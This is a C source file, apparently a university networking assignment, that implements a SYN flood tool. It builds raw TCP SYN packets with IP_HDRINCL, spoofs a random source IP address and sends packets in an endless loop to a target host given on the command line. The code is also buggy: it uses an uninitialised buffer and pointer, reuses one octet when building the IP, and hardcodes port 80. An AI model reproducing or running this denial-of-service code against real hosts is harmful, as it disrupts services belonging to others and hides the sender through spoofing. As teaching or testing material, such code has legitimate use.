/*
ALLAMNENI ARAVIND
2012C6PS661P
Undergrad @ BITS Pilani

Problem Statement:
Write a program synflood.c using raw sockets which works in the following way.
1) it takes server hostname and port on command-line.
2) it creates TCP SYN segment and appends ip header and sends to the remote host. It uses IP_HDRINCL socket option to include IP header.
3) it sends TCP SYN segment every 1 second, every time with a different source ip and source port.
  These addresses/port can be random numbers in  valid range.
4) it should display the received replies (SYN+ACK) from the server using libpcap library.
5) Program will not send any reply (ACK) segment to webserver. 

*/

#include<stdio.h> //for printf
#include<string.h> //memset
#include<sys/socket.h>    //for socket ofcourse
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip.h>    //Provides declarations for ip header
 
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};
 
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}
 
int main (int argc,char **argv)
{

    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
     
    if(s == -1)
    {
        //socket creation failed, may be because of non-root privileges
        perror("Failed to create socket");
        exit(1);
    }
     
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
     
    //zero out the packet buffer
    memset (datagram, 0, 4096);
     
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
     
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
     
    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
     
    //some address resolution



int num1=rand()%256;
int num2=rand()%256;
int num3=rand()%256;
int num4=rand()%256;
char numb1[10];
char numb2[10];
char numb3[10];
char numb4[10];
printf("\n%d\n",num1);
sprintf(numb1,"%d",num1);
sprintf(numb2,"%d",num2);
sprintf(numb3,"%d",num3);
sprintf(numb4,"%d",num4);
printf("\n%s\n",numb1);

/*
itoa(num1,numb1,100);
itoa(num2,numb2,100);
itoa(num3,numb3,100);
itoa(num4,numb4,100);
*/
strcat(source_ip,numb1);
strcat(source_ip,".");
strcat(source_ip,numb2);
strcat(source_ip,".");
strcat(source_ip,numb2);
strcat(source_ip,".");
strcat(source_ip,numb4);


//source_ip=num1+num2+num3+num4;

   // strcpy(source_ip , numb1+numb2+numb3+numb4);
printf("\n%s\n",source_ip);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr (argv[1]);
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    //Ip checksum
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
     
    //TCP Header
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;  //tcp header size
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;
     
    //Now the TCP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
     
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
     
    tcph->check = csum( (unsigned short*) pseudogram , psize);
     
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
     
    //loop if you want to flood :)
    while (1)
    {
        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            
	printf("\n%s\t",data);
printf ("SYN Send. Length : %d \n" , iph->tot_len);
        
}
char *receivedData;
if (recvfrom (s,receivedData, sizeof(receivedData),  0, NULL, NULL) < 0)
        {
            perror("recvfrom  failed");
        }
        //Data send successfully
        else
        {
            
	printf("\n%s\t",receivedData);
printf ("SYN+ACK received. Length : %d \n" , iph->tot_len);
        
}
sleep(5);
//goto label;
    }
     
    return 0;
}
 
//Complete




